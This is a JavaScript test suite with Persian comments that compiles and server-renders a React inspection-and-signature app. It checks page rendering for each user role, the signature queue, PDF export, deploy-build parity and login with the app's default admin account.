// شبیه‌سازی رندر واقعی: کد برنامه از index.html استخراج، با Babel به JS
// تبدیل و با React رندر می‌شود. هدف گرفتن خطاهایی است که تست‌های منطقی
// نمی‌بینند: متغیر تعریف‌نشده در JSX، prop اشتباه، کرش در زمان رندر.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

// @babel/standalone فقط build CJS دارد، پس در ESM باید با createRequire بار شود
const require = createRequire(import.meta.url);

// کتابخانه واقعی QR: با stub خام، مسیر buildQrSvgMarkup تست نمی‌شد.
const qrcodeFactory = (() => {
  const mod = require('qrcode-generator');
  const f = (typeof mod === 'function') ? mod : (mod.default || mod.qrcode);
  return f;
})();
import * as ReactNS from 'react';
import * as ReactDOMServer from 'react-dom/server';
import * as immer from 'immer';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const HTML = path.join(__dirname, '..', 'index.html');
const DEPLOY_HTML = path.join(__dirname, '..', 'deploy', 'index.html');

/* ------------------------------------------------------- استخراج و کامپایل */

function extractAppSource() {
  const html = fs.readFileSync(HTML, 'utf8');
  const startTag = '<script type="text/plain" id="app-source">';
  const i = html.indexOf(startTag);
  assert.ok(i >= 0, 'بلوک app-source پیدا نشد');
  const from = i + startTag.length;
  return html.slice(from, html.indexOf('</script>', from));
}

const EXPORTS = [
  'DataContext', 'NAV_ITEMS', 'ASSIGNABLE_PAGES', 'DEFAULT_PAGES_BY_ROLE', 'ensureLib', 'LIB_SOURCES',
  'makeDefaultData', 'verifyCredential', 'makeCredential', 'HASH_ALGO', 'PBKDF2_ITERATIONS', 'migrateData', 'LoginScreen', 'diagnoseLoginInput',
  'sha256BytesPure', 'pbkdf2Sha256Pure', 'HAS_SUBTLE',
  'effectivePages', 'buildPermissions', 'buildSignQueue', 'makeSignRequest',
  'normalizeSignRequest', 'applySignatureToRecord', 'cancelSignRequest',
  'canSignRequest', 'signRequestCandidates', 'SIGN_REQUEST_STATUS', 'SIGN_SLOTS',
  'makeSignChain', 'signChainProgress', 'signChainLabel', 'signSlotLabel', 'validateSignChain',
  'isSignChainMode', 'resolveSignFlowMode', 'SIGN_FLOW_MODES', 'SIGN_SLOT_SEQUENCE',
  'templateSignerCount', 'signSlotsForCount', 'signerCountLabel',
  'referSignRequest', 'canReferSignRequest', 'TemplateEditor', 'activeSignStep',
  'SignChainBox', 'SignChainTrack', 'renderSignatureBoxes', 'DEFAULT_ADMIN_CRED', 'DEFAULT_PIN_CRED',
  'migrateData', 'scoreRecord', 'htmlToPdfBase64', 'recordReportHtml',
  'SignQueuePage', 'SignReferralBox', 'RecordsPage', 'DashboardPage', 'CoveragePage',
  'templateCoverage', 'periodKey', 'periodWindowLabel', 'PERIOD_LABELS', 'resolveTemplatePeriod',
  'prevPeriodKey', 'periodElapsedRatio', 'coverageAlerts', 'AT_RISK_RATIO', 'CorrectivesPage', 'TrendChart',
  'gregorianToJalaliStr',
  'RunnerPage', 'TasksPage', 'AssetsPage', 'TemplatesPage', 'UsersPage',
  'exportRecordsCsv', 'exportRecordsXlsx',
  'StatusBadge', 'Badge',
  'readStoredSession', 'writeStoredSession', 'clearStoredSession', 'isStoredSessionExpired_',
  'SESSION_KEY', 'SESSION_LOCAL_KEY',
];

let cache = null;
/** کد از پیش کامپایل‌شده در `deploy/index.html` (خروجی tools/build.mjs) */
function extractDeployCode() {
  assert.ok(fs.existsSync(DEPLOY_HTML),
    'deploy/index.html وجود ندارد — اول `npm run build` را اجرا کنید');
  const html = fs.readFileSync(DEPLOY_HTML, 'utf8');
  const startTag = '<script type="text/plain" id="app-source-compiled">';
  const i = html.indexOf(startTag);
  assert.ok(i >= 0, 'بلوک app-source-compiled در deploy/index.html پیدا نشد');
  const j = html.indexOf('</script>', i);
  assert.ok(j > i, 'بلوک app-source-compiled بسته نشده است');
  return html.slice(i + startTag.length, j);
}

let deployCache = null;

function loadApp(opts = {}) {
  const isDeploy = !!opts.deploy;
  if (isDeploy) { if (deployCache) return deployCache; }
  else if (cache) return cache;

  let out;
  if (isDeploy) {
    // اینجا عمداً Babel بار نمی‌شود: کل نقطه‌ی `deploy/` این است که خروجی
    // همان چیزی باشد که مرورگر اجرا می‌کند (کامپایل در زمان build).
    out = extractDeployCode();
  } else {
    const Babel = require('@babel/standalone');
    const src = extractAppSource();
    // فقط JSX لازم است تبدیل شود؛ کد برنامه خودش ES5/ES6 سازگار با مرورگر است و
    // در آن import/export وجود ندارد، پس preset «env» را اصلاً بار نمی‌کنیم
    // (در build standalone با targets نامعتبر می‌شکند).
    out = Babel.transform(src, {
      presets: [['react', { runtime: 'classic' }]],
      filename: 'app.jsx',
    }).code;
  }

  // ---- محیط شبه‌مرورگری ----
  const store = new Map();
  const storage = {
    getItem: k => (store.has(k) ? store.get(k) : null),
    setItem: (k, v) => store.set(k, String(v)),
    removeItem: k => store.delete(k),
    clear: () => store.clear(),
  };
  const win = {
    immer,
    devicePixelRatio: 1,
    innerWidth: 1280, innerHeight: 900,
    location: { search: '', href: 'http://localhost/' },
    addEventListener() {}, removeEventListener() {},
    matchMedia: () => ({ matches: false, addEventListener() {}, removeEventListener() {} }),
    print() {}, open: () => null,
    navigator: { onLine: true, sendBeacon: () => true, clipboard: { writeText: async () => {} } },
  };
  /* DOM کوچکِ ضبط‌کننده (رفع ایراد #12)

     پیش‌تر `createElement` یک آبجکت خالی برمی‌گرداند که هیچ چیزی را ذخیره
     نمی‌کرد؛ در نتیجه `htmlToPdfBase64` عملاً تست نمی‌شد و اگر روزی API
     کتابخانه یا ترتیب فراخوانی‌ها عوض می‌شد، هیچ تستی نمی‌گرفتش.

     حالا هر عنصر attributeها، style.cssText، innerHTML و والد/فرزندان را ثبت
     می‌کند و `doc.__log` تاریخچه‌ی عملیات را نگه می‌دارد تا قابل ادعا باشد. */
  const log = [];
  const makeEl = (tag) => {
    const el = {
      tagName: String(tag || 'div').toUpperCase(),
      attrs: {}, style: { cssText: '' }, innerHTML: '', textContent: '',
      children: [], parent: null, removed: false,
      setAttribute(k, v) { el.attrs[k] = String(v); log.push('setAttribute:' + k); },
      getAttribute(k) { return el.attrs[k] === undefined ? null : el.attrs[k]; },
      appendChild(c) { el.children.push(c); if (c) c.parent = el; log.push('appendChild:' + el.tagName); return c; },
      removeChild(c) { const i = el.children.indexOf(c); if (i > -1) el.children.splice(i, 1); return c; },
      remove() { el.removed = true; if (el.parent) el.parent.removeChild(el); log.push('remove:' + el.tagName); },
      classList: { add() {}, remove() {}, contains: () => false },
      getContext: () => null,
      get clientWidth() { return 794; },
      get clientHeight() { return 300; },
    };
    Object.defineProperty(el.style, 'width', { value: '', writable: true });
    return el;
  };
  const body = makeEl('body');
  const doc = {
    body,
    __log: log,
    __created: [],
    getElementById: (id) => { const e = makeEl('div'); e.attrs.id = id; return e; },
    createElement: (tag) => { const e = makeEl(tag); doc.__created.push(e); return e; },
    addEventListener() {}, removeEventListener() {},
    querySelector: () => null,
  };
  const xlsxStub = {
    __written: [],
    utils: {
      book_new: () => ({ sheets: {} }),
      json_to_sheet: (rows) => ({ rows: rows.slice() }),
      book_append_sheet: (wb, sheet, name) => { wb.sheets[name] = sheet; },
      sheet_to_csv: () => '',
    },
    writeFile(wb, name) { xlsxStub.__written.push({ name, sheets: Object.keys(wb.sheets || {}), wb }); },
    read: () => ({}),
  };
  const React = Object.assign({}, ReactNS, { default: ReactNS });
  const ReactDOM = { createRoot: () => ({ render() {}, unmount() {} }) };

  win.XLSX = xlsxStub;
  const factory = new Function(
    'React', 'ReactDOM', 'window', 'document', 'navigator', 'sessionStorage', 'localStorage',
    'indexedDB', 'qrcode', 'XLSX', 'Html5Qrcode', 'html2pdf', 'location', 'fetch',
    `"use strict";\n${out}\n; return { ${EXPORTS.join(', ')} };`
  );

  const app = factory(
    React, ReactDOM, win, doc, win.navigator, storage, storage,
    undefined, qrcodeFactory, xlsxStub,
    function Html5QrcodeStub() { this.start = async () => {}; this.stop = async () => {}; },
    function html2pdfStub() { return { from: () => ({ save: async () => {}, toPdf: () => ({ save: async () => {} }) }) }; },
    win.location, async () => ({ ok: false })
  );
  app.__React = ReactNS;
  app.__win = win;
  app.__doc = doc;
  if (isDeploy) { deployCache = app; } else { cache = app; }
  return app;
}

/* ------------------------------------------------------------- داده نمونه */

const ADMIN = { id: 'u-admin', username: 'admin', name: 'ادمین سازمان', role: 'admin', active: true, pages: [] };
const ALI = { id: 'u-ali', username: 'ali', name: 'علی محمدی', role: 'inspector', active: true, pages: ['dashboard', 'runner', 'records'] };
const REZA = { id: 'u-reza', username: 'reza', name: 'رضا کریمی', role: 'approver', active: true, pages: [] };
const MGR = { id: 'u-mgr', username: 'mgr', name: 'مدیر داخلی', role: 'manager', active: true, pages: [] };
const VIEWER = { id: 'u-vw', username: 'vw', name: 'مشاهده‌گر', role: 'viewer', active: true, pages: [] };

function sampleData(app, overrides = {}) {
  const at = Date.now();
  const rec = {
    id: 'r1', assetId: 'a1', assetCode: 'DB-01', assetName: 'تابلو برق ۱', location: 'سالن ۱',
    templateId: 't1', templateName: 'بازرسی تابلو', category: 'برق',
    inspectorId: ALI.id, inspectorName: ALI.name,
    date: '1405/06/22 - 10:30', dateJalali: '1405/06/22', completedAt: new Date(at).toISOString(),
    percent: 100, score: 100, maxScore: 100, status: 'موفق', criticalFail: false,
    details: [{ itemId: 'i1', label: 'ارت', value: true, earned: 100, max: 100, critical: true }],
    notes: '', signatures: { inspector: { image: 'data:ins', name: ALI.name, title: '' } },
    signRequest: app.makeSignRequest({ toUser: REZA, byUser: ALI, slot: 'approver', note: 'ناظر شیفت عصر', at }),
    createdAt: at, updatedAt: at,
  };
  return Object.assign({
    version: 4,
    users: [ADMIN, ALI, REZA, MGR, VIEWER],
    categories: ['برق', 'مکانیک'],
    templates: [{ id: 't1', name: 'بازرسی تابلو', category: 'برق', passThreshold: 80, archived: false, items: [{ id: 'i1', type: 'yesno', label: 'ارت', weight: 100, critical: true }] }],
    assets: [{ id: 'a1', code: 'DB-01', name: 'تابلو برق ۱', location: 'سالن ۱', templateId: 't1', category: 'برق' }],
    assignments: [],
    records: [rec],
    settings: { orgName: 'سازمان درکاو', passThreshold: 80 },
    revision: 3, lastSyncAt: at,
  }, overrides);
}

function ctxFor(app, user, data, extra = {}) {
  return Object.assign({
    data,
    update: (fn) => { fn(data); },
    session: { userId: user.id, username: user.username },
    login: async () => ({}), logout: () => {},
    currentUser: user,
    perms: app.buildPermissions(user),
    verifyManagerPin: async () => true,
    notify: () => {},
    sync: { status: 'idle', pending: 0, revision: 3, lastSyncAt: 0, conflicts: [], error: '' },
    ensureRecordVisuals: async (r) => r,
    cloudBootstrapping: false,
    toast: null,
  }, extra);
}

function render(app, user, element, data) {
  const React = app.__React;
  const ctx = ctxFor(app, user, data || sampleData(app));
  return ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctx }, element)
  );
}

/* ------------------------------------------------- DOM/کتابخانه‌های تزریقی */

// `htmlToPdfBase64` از `new FileReader()` و `window.html2pdf()` استفاده می‌کند.
// چون کد برنامه داخل `new Function` اجرا می‌شود، FileReader از global گرفته
// می‌شود و html2pdf از شیء window — هر دو را اینجا قابل کنترل می‌کنیم.
class FakeFileReader {
  constructor() { this.result = null; this.error = null; this.onload = null; this.onerror = null; }
  readAsDataURL(blob) {
    // base64 بلندِ ساختگی؛ تابع فقط وقتی مقدار را برمی‌گرداند که >۲۰۰ نویسه باشد
    this.result = 'data:application/pdf;base64,' + (blob && blob.__b64 ? blob.__b64 : 'A'.repeat(400));
    if (this.onload) this.onload();
  }
}

function installHtml2pdf(win, opts = {}) {
  const calls = [];
  win.html2pdf = function html2pdf() {
    const chain = {
      set(o) { calls.push({ step: 'set', o }); return chain; },
      from(holder) { calls.push({ step: 'from', holder }); return chain; },
      outputPdf(kind) {
        calls.push({ step: 'outputPdf', kind });
        if (opts.fail) return Promise.reject(new Error('html2pdf شکست ساختگی'));
        return Promise.resolve({ __b64: opts.short ? 'QQ==' : 'A'.repeat(400) });
      },
    };
    return chain;
  };
  return calls;
}

/* ================================================================= تست‌ها */

test('کد برنامه با Babel کامپایل و همه‌ی اجزای موردنیاز صادر می‌شوند', () => {
  const app = loadApp();
  for (const name of EXPORTS) {
    assert.ok(app[name] !== undefined, `«${name}» از کد برنامه صادر نشد`);
  }
  assert.equal(typeof app.SignQueuePage, 'function');
  assert.equal(typeof app.SignReferralBox, 'function');
});

test('صفحه «در انتظار امضا» برای گیرنده رندر می‌شود و دکمه امضا دارد', () => {
  const app = loadApp();
  const out = render(app, REZA, app.__React.createElement(app.SignQueuePage, { goRecord: () => {} }));
  assert.ok(out.includes('در انتظار امضا'), 'عنوان صفحه باید باشد');
  assert.ok(out.includes('DB-01'), 'کد تجهیز باید فهرست شود');
  assert.ok(out.includes('امضا در محل'), 'گیرنده باید دکمه امضا در محل ببیند');
  assert.ok(out.includes('ارجاع به دیگری'), 'گیرنده باید گزینه‌ی ارجاع هم داشته باشد');
  assert.ok(out.includes('ناظر شیفت عصر'), 'توضیح ارجاع باید نمایش داده شود');
  assert.ok(out.includes('علی محمدی'), 'نام ارجاع‌دهنده باید باشد');
  assert.ok(!out.includes('لغو درخواست'), 'گیرنده نباید بتواند لغو کند');
});

test('صفحه «در انتظار امضا» برای کاربر بی‌ربط خالی و بی‌خطا رندر می‌شود', () => {
  const app = loadApp();
  const out = render(app, MGR, app.__React.createElement(app.SignQueuePage, { goRecord: () => {} }));
  assert.ok(out.includes('در انتظار امضا'));
  assert.ok(out.includes('درخواست امضای بازی در انتظار شما نیست'), 'پیام خالی بودن باید نمایش داده شود');
  assert.ok(!out.includes('امضا کردن'), 'مدیرِ غیرگیرنده نباید دکمه امضا ببیند');
});

test('ادمین تب «همه‌ی درخواست‌های باز» را می‌بیند (رفع ایراد P2-۷)', () => {
  const app = loadApp();
  const out = render(app, ADMIN, app.__React.createElement(app.SignQueuePage, { goRecord: () => {} }));
  // تب پیش‌فرض «باید امضا کنم» است و برای ادمین خالی، چون این درخواست خطاب به
  // ناظر است نه خودش. حق جانشینی در تب دوم حفظ شده است.
  assert.ok(out.includes('همه‌ی درخواست‌های باز'), 'تب سراسری ادمین باید وجود داشته باشد');
  assert.ok(out.includes('درخواست امضای بازی در انتظار شما نیست'),
    'صف شخصی ادمین باید خالی باشد، نه پر از درخواست دیگران');
  assert.ok(!out.includes('DB-01'), 'رکورد دیگران نباید در تب شخصی ادمین بیفتد');
});

test('غیرادمین تب سراسری را نمی‌بیند', () => {
  const app = loadApp();
  const out = render(app, REZA, app.__React.createElement(app.SignQueuePage, { goRecord: () => {} }));
  assert.ok(!out.includes('همه‌ی درخواست‌های باز'), 'ناظر نباید تب سراسری ادمین را ببیند');
  assert.ok(out.includes('DB-01'));
});

test('buildSignQueue: ادمین همه‌ی بازها را در adminAll دارد و حق امضا حفظ می‌شود', () => {
  const app = loadApp();
  const data = sampleData(app);
  const q = app.buildSignQueue(data.records, ADMIN, app.buildPermissions(ADMIN));
  assert.equal(q.toSign.length, 0, 'صف شخصی ادمین خالی است');
  assert.equal(q.adminAll.length, 1, 'درخواست باز در سطل سراسری ادمین است');
  assert.equal(q.adminAll[0].record.id, 'r1');
  assert.ok(app.canSignRequest(q.adminAll[0].record, ADMIN, app.buildPermissions(ADMIN)),
    'ادمین همچنان می‌تواند به جانشینی امضا کند');

  const qReza = app.buildSignQueue(data.records, REZA, app.buildPermissions(REZA));
  assert.equal(qReza.toSign.length, 1, 'گیرنده‌ی واقعی در صف شخصی‌اش می‌بیند');
  assert.deepEqual(qReza.adminAll, [], 'غیرادمین سطل سراسری ندارد');
});

test('ارجاع‌دهنده دکمه لغو دارد ولی دکمه امضا ندارد', () => {
  const app = loadApp();
  // بازرس در تب «باید امضا کنم» چیزی نمی‌بیند، پس تب پیگیری را بررسی می‌کنیم
  const data = sampleData(app);
  const out = render(app, ALI, app.__React.createElement(app.SignQueuePage, { goRecord: () => {} }), data);
  assert.ok(out.includes('در انتظار امضا'));
  // تب پیش‌فرض toSign است و برای بازرس خالی
  assert.ok(out.includes('درخواست امضای بازی در انتظار شما نیست'));
});

test('SignReferralBox فقط کاربران فعالِ تأییدکننده را فهرست می‌کند', () => {
  const app = loadApp();
  const React = app.__React;
  const data = sampleData(app);
  const out = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.SignReferralBox, {
      users: data.users, currentUser: ALI, value: '', note: '',
      onChange: () => {}, onNoteChange: () => {},
    })
  );
  assert.ok(out.includes('جهت امضا'), 'عنوان بخش');
  assert.ok(out.includes('رضا کریمی'), 'تأییدکننده باید در فهرست باشد');
  assert.ok(out.includes('مدیر داخلی'), 'مدیر باید در فهرست باشد');
  assert.ok(out.includes('ادمین سازمان'), 'ادمین باید در فهرست باشد');
  assert.ok(!out.includes('>علی محمدی<'), 'خود کاربر نباید در فهرست باشد');
  assert.ok(!out.includes('مشاهده‌گر'), 'نقش مشاهده‌گر نمی‌تواند تأیید کند');
});

test('SignReferralBox بدون نامزدِ معتبر، راهنمایی نشان می‌دهد نه select خالی', () => {
  const app = loadApp();
  const React = app.__React;
  const out = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.SignReferralBox, {
      users: [ALI, VIEWER], currentUser: ALI, value: '', note: '',
      onChange: () => {}, onNoteChange: () => {},
    })
  );
  assert.ok(out.includes('کاربر فعالی با نقش تأییدکننده'), 'باید راهنما نشان دهد');
  assert.ok(!out.includes('<select'), 'select بی‌فایده رندر نشود');
});

test('صفحه سوابق با رکورد در انتظار امضا، نشان مربوطه را نشان می‌دهد', () => {
  const app = loadApp();
  const out = render(app, ADMIN, app.__React.createElement(app.RecordsPage, {}));
  assert.ok(out.includes('DB-01'));
  assert.ok(out.includes('در انتظار امضا'), 'نشان درخواست باز باید در جدول سوابق باشد');
});

test('داشبورد کارت «برگه در انتظار امضای شما» را به گیرنده نشان می‌دهد', () => {
  const app = loadApp();
  const out = render(app, REZA, app.__React.createElement(app.DashboardPage, { goPage: () => {}, goRunner: () => {} }));
  assert.ok(out.includes('برگه در انتظار امضای شما'), 'کارت باید باشد');
  const outAli = render(app, ALI, app.__React.createElement(app.DashboardPage, { goPage: () => {}, goRunner: () => {} }));
  assert.ok(!outAli.includes('برگه در انتظار امضای شما'), 'بازرسِ غیرگیرنده نباید کارت را ببیند');
});

test('صفحه اجرای بازرسی: نام بازرس قفل است و از حساب کاربری می‌آید', () => {
  const app = loadApp();
  const out = render(app, ALI, app.__React.createElement(app.RunnerPage, { assetId: 'a1' }));
  assert.ok(out.includes('علی محمدی'), 'نام کاربر باید نمایش داده شود');
  assert.ok(out.includes('از حساب کاربری شما خوانده می‌شود'), 'راهنمای قفل بودن');
  assert.ok(out.includes('زنجیره‌ی امضا'), 'بخش زنجیره‌ی امضا باید در صفحه اجرا باشد');
  // فیلد نام بازرس باید غیرفعال باشد
  const m = out.match(/<input[^>]*disabled[^>]*readonly[^>]*value="علی محمدی"/) ||
            out.match(/<input[^>]*readonly[^>]*disabled[^>]*value="علی محمدی"/);
  assert.ok(m, 'فیلد نام بازرس باید disabled+readonly باشد');
});

test('آیتم «در انتظار امضا» در منو هست و در فهرست قابل‌واگذاری نیست', () => {
  const app = loadApp();
  const nav = app.NAV_ITEMS.find(n => n.key === 'signQueue');
  assert.ok(nav, 'آیتم منو باید وجود داشته باشد');
  assert.equal(nav.label, 'در انتظار امضا');
  assert.ok(!app.ASSIGNABLE_PAGES.some(p => p.key === 'signQueue'),
    'نباید قابل حذف از طریق واگذاری دسترسی باشد');
  // همه نقش‌ها صفحه را می‌گیرند
  for (const u of [ADMIN, ALI, REZA, MGR, VIEWER]) {
    assert.ok(app.effectivePages(u).includes('signQueue'), `نقش ${u.role} باید صفحه را داشته باشد`);
  }
});

test('رندر همه‌ی صفحات اصلی برای هر نقش بدون خطا', () => {
  const app = loadApp();
  const React = app.__React;
  const pages = [
    ['SignQueuePage', {}],
    ['RecordsPage', {}],
    ['DashboardPage', { goPage: () => {}, goRunner: () => {} }],
    ['TasksPage', { goRunner: () => {} }],
    ['AssetsPage', { goRunner: () => {} }],
    ['CoveragePage', { goRunner: () => {} }],
    ['CorrectivesPage', { goRecord: () => {} }],
    ['TemplatesPage', {}],
    ['UsersPage', {}],
    ['RunnerPage', { assetId: 'a1' }],
  ];
  for (const user of [ADMIN, ALI, REZA, MGR, VIEWER]) {
    for (const [name, props] of pages) {
      const Comp = app[name];
      if (!Comp) continue;
      assert.doesNotThrow(() => {
        ReactDOMServer.renderToStaticMarkup(
          React.createElement(app.DataContext.Provider, { value: ctxFor(app, user, sampleData(app)) },
            React.createElement(Comp, props))
        );
      }, `رندر ${name} برای نقش ${user.role} شکست خورد`);
    }
  }
});

/* ============ #12: مسیر PDF سمت کلاینت واقعاً اجرا شود ============ */

test('htmlToPdfBase64: holder را می‌سازد، به html2pdf می‌دهد و پاکسازی می‌کند', async () => {
  globalThis.FileReader = FakeFileReader;
  const app = loadApp();
  const calls = installHtml2pdf(app.__win);

  const out = await app.htmlToPdfBase64('<h1>گزارش</h1>', '.a{color:red}');

  assert.ok(typeof out === 'string' && out.length > 200, 'باید base64 برگرداند');
  assert.deepEqual(calls.map(c => c.step), ['set', 'from', 'outputPdf'], 'ترتیب فراخوانی‌های html2pdf');
  assert.equal(calls[2].kind, 'blob');

  const holder = calls[1].holder;
  assert.equal(holder.attrs.dir, 'rtl', 'holder باید rtl باشد');
  assert.ok(holder.style.cssText.includes('-10000px'), 'holder باید بیرون از دید قرار گیرد');
  assert.ok(holder.innerHTML.includes('<style>.a{color:red}</style>'), 'CSS باید تزریق شود');
  assert.ok(holder.innerHTML.includes('<h1>گزارش</h1>'), 'محتوای گزارش باید باشد');
  assert.equal(holder.removed, true, 'holder باید در finally پاک شود (نشت DOM)');
  assert.equal(app.__doc.body.children.length, 0, 'بدنه‌ی سند باید تمیز بماند');
});

test('htmlToPdfBase64: اگر html2pdf نباشد null می‌دهد (بدون crash)', async () => {
  globalThis.FileReader = FakeFileReader;
  const app = loadApp();
  delete app.__win.html2pdf;
  const out = await app.htmlToPdfBase64('<p>x</p>', '');
  assert.equal(out, null, 'باید بی‌صدا null برگرداند تا مسیر سرور جایگزین شود');
});

test('htmlToPdfBase64: خطای html2pdf را می‌گیرد و holder را پاک می‌کند', async () => {
  globalThis.FileReader = FakeFileReader;
  const app = loadApp();
  const calls = installHtml2pdf(app.__win, { fail: true });
  const origError = console.error;
  console.error = () => {};
  let out;
  try { out = await app.htmlToPdfBase64('<p>x</p>', ''); } finally { console.error = origError; }
  assert.equal(out, null, 'خطا باید به null تبدیل شود، نه استثنا');
  assert.equal(calls[1].holder.removed, true, 'حتی در خطا باید پاکسازی شود');
});

test('htmlToPdfBase64: خروجی کوتاه/نامعتبر را null می‌کند', async () => {
  globalThis.FileReader = FakeFileReader;
  const app = loadApp();
  installHtml2pdf(app.__win, { short: true });
  const out = await app.htmlToPdfBase64('<p>x</p>', '');
  assert.equal(out, null, 'base64 کوتاه یعنی PDF معتبر ساخته نشده');
});

/* ===== خروجی `deploy/` (JSX از پیش کامپایل‌شده) — همان چیزی که مرورگر اجرا می‌کند =====
   نکته: این تست‌ها عمداً Babel را بار نمی‌زنند. اگر روزی build.mjs خراب شود یا
   presetها عوض شوند و خروجی deploy رفتار متفاوتی پیدا کند، اینجا گرفته می‌شود. */

test('deploy build: همه‌ی نمادها صادر می‌شوند (بدون Babel)', () => {
  const app = loadApp({ deploy: true });
  for (const name of EXPORTS) {
    assert.ok(app[name] !== undefined, `«${name}» در خروجی deploy صادر نشده`);
  }
  assert.equal(typeof app.SignQueuePage, 'function');
  assert.equal(typeof app.ensureLib, 'function', 'بارگذار تنبل باید در deploy هم باشد');
});

test('deploy build: همه‌ی صفحات برای هر ۵ نقش رندر می‌شوند', () => {
  const app = loadApp({ deploy: true });
  const React = app.__React;
  const pages = [
    ['RecordsPage', {}], ['DashboardPage', { goPage: () => {}, goRunner: () => {} }],
    ['TasksPage', { goRunner: () => {} }], ['AssetsPage', { goRunner: () => {} }],
    ['TemplatesPage', {}], ['UsersPage', {}], ['RunnerPage', { assetId: 'a1' }],
    ['SignQueuePage', {}],
  ];
  let rendered = 0;
  for (const user of [ADMIN, ALI, REZA, MGR, VIEWER]) {
    for (const [name, props] of pages) {
      const Comp = app[name];
      if (!Comp) continue;
      assert.doesNotThrow(() => {
        ReactDOMServer.renderToStaticMarkup(
          React.createElement(app.DataContext.Provider, { value: ctxFor(app, user, sampleData(app)) },
            React.createElement(Comp, props))
        );
      }, `رندر ${name} برای نقش ${user.role} در خروجی deploy شکست خورد`);
      rendered++;
    }
  }
  assert.ok(rendered >= 30, `تعداد رندرهای انجام‌شده کم است: ${rendered}`);
});

test('deploy build: خروجی رندر با نسخه‌ی JSX یکسان است', () => {
  const src = loadApp();
  const dep = loadApp({ deploy: true });
  for (const name of ['RecordsPage', 'DashboardPage', 'AssetsPage']) {
    if (!src[name] || !dep[name]) continue;
    const a = render(src, ADMIN, src.__React.createElement(src[name], name === 'DashboardPage' ? { goPage: () => {}, goRunner: () => {} } : (name === 'AssetsPage' ? { goRunner: () => {} } : {})));
    const b = render(dep, ADMIN, dep.__React.createElement(dep[name], name === 'DashboardPage' ? { goPage: () => {}, goRunner: () => {} } : (name === 'AssetsPage' ? { goRunner: () => {} } : {})));
    assert.equal(b, a, `خروجی deploy برای ${name} با نسخه‌ی JSX فرق دارد`);
  }
});

test('deploy/index.html: هیچ وابستگی به Babel ندارد', () => {
  const html = fs.readFileSync(DEPLOY_HTML, 'utf8');
  assert.equal((html.match(/babel\.min\.js/g) || []).length, 0, 'تگ Babel باید حذف شده باشد');
  assert.equal((html.match(/Babel\.transform/g) || []).length, 0, 'فراخوانی Babel.transform باید رفته باشد');
  assert.ok(!html.includes('id="app-source"'), 'بلوک JSX خام نباید در deploy بماند');
  assert.ok(html.includes('id="app-source-compiled"'), 'بلوک کامپایل‌شده باید باشد');
  assert.ok(html.includes("missing.push('React')"), 'boot guard برای React باید بماند');
  // کتابخانه‌های سنگین باید lazy باشند، نه در بار اولیه
  for (const lib of ['html2pdf.bundle.min.js', 'xlsx.full.min.js', 'html5-qrcode.min.js']) {
    assert.ok(!html.includes('<script src="https://unpkg.com/' + lib),
      `${lib} نباید به‌صورت تگ script در بار اولیه باشد`);
    assert.ok(html.includes(lib), `${lib} باید داخل LIB_SOURCES برای بارگذاری تنبل باشد`);
  }
});

/* ============ شبیه‌سازی ورود با حساب پیش‌فرض admin / 1234 ============
   گزارش شده بود که ورود با admin/1234 کار نمی‌کند. این تست کل مسیر را
   شبیه‌سازی می‌کند: ساخت داده‌ی پیش‌فرض → پیدا کردن کاربر → تأیید رمز،
   دقیقاً با همان شرط‌هایی که تابع `login` استفاده می‌کند. */

test('شبیه‌سازی ورود: داده‌ی پیش‌فرض admin با رمز 1234 ساخته می‌شود', async () => {
  const app = loadApp();
  const data = await app.makeDefaultData();

  assert.ok(data && Array.isArray(data.users) && data.users.length, 'داده‌ی پیش‌فرض باید کاربر داشته باشد');
  const admin = data.users.find(u => u.username === 'admin');
  assert.ok(admin, 'کاربر admin باید در داده‌ی پیش‌فرض باشد');

  // همان شرطی که login استفاده می‌کند: u.username === uname && u.active !== false
  assert.equal(admin.username, 'admin');
  assert.notEqual(admin.active, false, 'admin نباید غیرفعال باشد');
  assert.equal(admin.role, 'admin');

  // فیلدهای امنیتی باید بعد از migrateData هم دست‌نخورده مانده باشند
  assert.equal(admin.hashAlgo, app.HASH_ALGO, 'hashAlgo باید pbkdf2-sha256 باشد');
  assert.ok(admin.salt && admin.salt.length >= 16, 'salt باید پر باشد');
  assert.equal(admin.iterations, app.PBKDF2_ITERATIONS, 'iterations باید ۱۲۰۰۰۰ باشد');
  assert.ok(admin.passwordHash && /^[0-9a-f]{64}$/.test(admin.passwordHash), 'هش باید ۶۴ نویسه‌ی hex باشد');
  assert.equal(admin.usingDefaultPassword, true, 'پرچم رمز پیش‌فرض باید باشد تا هشدار نشان داده شود');

  const verdict = await app.verifyCredential(admin, '1234');
  assert.equal(verdict.ok, true, 'ورود با admin/1234 باید موفق باشد');
  assert.equal(verdict.upgrade, null, 'نیازی به ارتقای هش نیست');

  assert.equal((await app.verifyCredential(admin, '1235')).ok, false, 'رمز غلط باید رد شود');
  assert.equal((await app.verifyCredential(admin, '')).ok, false, 'رمز خالی باید رد شود');
});

test('شبیه‌سازی ورود: دام‌های رایج ورودی که کاربر فارسی‌زبان می‌افتد', async () => {
  const app = loadApp();
  const data = await app.makeDefaultData();
  const admin = data.users.find(u => u.username === 'admin');

  // ۱) ارقام فارسی: کیبورد فارسی به‌جای 1234 می‌دهد ۱۲۳۴ — بایت‌ها فرق دارند
  const persianDigits = '۱۲۳۴';
  assert.equal((await app.verifyCredential(admin, persianDigits)).ok, false,
    'ارقام فارسی با رمز لاتین یکی نیستند — این یک دام واقعی است');
  // ۲) فاصله‌ی ناخواسته‌ی ابتدا/انتها در رمز (username در login تrیم می‌شود ولی password نه)
  assert.equal((await app.verifyCredential(admin, ' 1234')).ok, false, 'فاصله‌ی ابتدای رمز آن را باطل می‌کند');
  assert.equal((await app.verifyCredential(admin, '1234 ')).ok, false, 'فاصله‌ی انتهای رمز آن را باطل می‌کند');
  // ۳) بزرگی/کوچکی حروف در نام کاربری
  const byUpper = data.users.find(u => u.username === 'ADMIN');
  assert.equal(byUpper, undefined, 'نام کاربری حساس به بزرگی حروف است — ADMIN پیدا نمی‌شود');
  // ۴) نیم‌فاصله/کاراکتر نامرئی
  assert.equal((await app.verifyCredential(admin, '1234\u200c')).ok, false, 'نیم‌فاصله‌ی چسبیده به رمز آن را باطل می‌کند');
});

